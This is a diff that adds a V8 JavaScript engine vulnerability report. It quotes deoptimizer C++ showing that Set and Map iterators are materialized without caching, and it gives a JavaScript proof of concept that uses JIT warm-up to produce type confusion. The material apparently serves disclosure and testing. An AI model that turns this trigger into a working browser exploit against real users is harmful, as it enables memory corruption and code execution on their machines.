@@ -1,0 +1,61 @@
+/*
+Here'a snippet of TranslatedState::MaterializeCapturedObjectAt.
+    case JS_SET_KEY_VALUE_ITERATOR_TYPE:
+    case JS_SET_VALUE_ITERATOR_TYPE: {
+      Handle<JSSetIterator> object = Handle<JSSetIterator>::cast(
+          isolate_->factory()->NewJSObjectFromMap(map, NOT_TENURED));
+      Handle<Object> properties = materializer.FieldAt(value_index);
+      Handle<Object> elements = materializer.FieldAt(value_index);
+      Handle<Object> table = materializer.FieldAt(value_index);
+      Handle<Object> index = materializer.FieldAt(value_index);
+      object->set_raw_properties_or_hash(*properties);
+      object->set_elements(FixedArrayBase::cast(*elements));
+      object->set_table(*table);
+      object->set_index(*index);
+      return object;
+    }
+    case JS_MAP_KEY_ITERATOR_TYPE:
+    case JS_MAP_KEY_VALUE_ITERATOR_TYPE:
+    case JS_MAP_VALUE_ITERATOR_TYPE: {
+      Handle<JSMapIterator> object = Handle<JSMapIterator>::cast(
+          isolate_->factory()->NewJSObjectFromMap(map, NOT_TENURED));
+      Handle<Object> properties = materializer.FieldAt(value_index);
+      Handle<Object> elements = materializer.FieldAt(value_index);
+      Handle<Object> table = materializer.FieldAt(value_index);
+      Handle<Object> index = materializer.FieldAt(value_index);
+      object->set_raw_properties_or_hash(*properties);
+      object->set_elements(FixedArrayBase::cast(*elements));
+      object->set_table(*table);
+      object->set_index(*index);
+      return object;
+    }
+
+For these 5 types, it doesn't cache the created objects like "slot->value_ = object". This can be used to create different objects but sharing the same properties which may lead to type confusion.
+
+PoC:
+*/
+
+function opt(b) {
+    let iterator = new Set().values();
+    iterator.x = 0;
+
+    let arr = [iterator, iterator];
+    if (b)
+        return arr.slice();
+}
+
+for (let i = 0; i < 100000; i++)
+    opt(false);
+
+let res = opt(true);
+let a = res[0];
+let b = res[1];
+
+print(a === b);  // false
+a.x = 7;
+
+print(b.x);  // 7
+
+a.a = 1.1;  // transition
+b.b = 0x1234;
+a.a = 1.1;  // type confusion
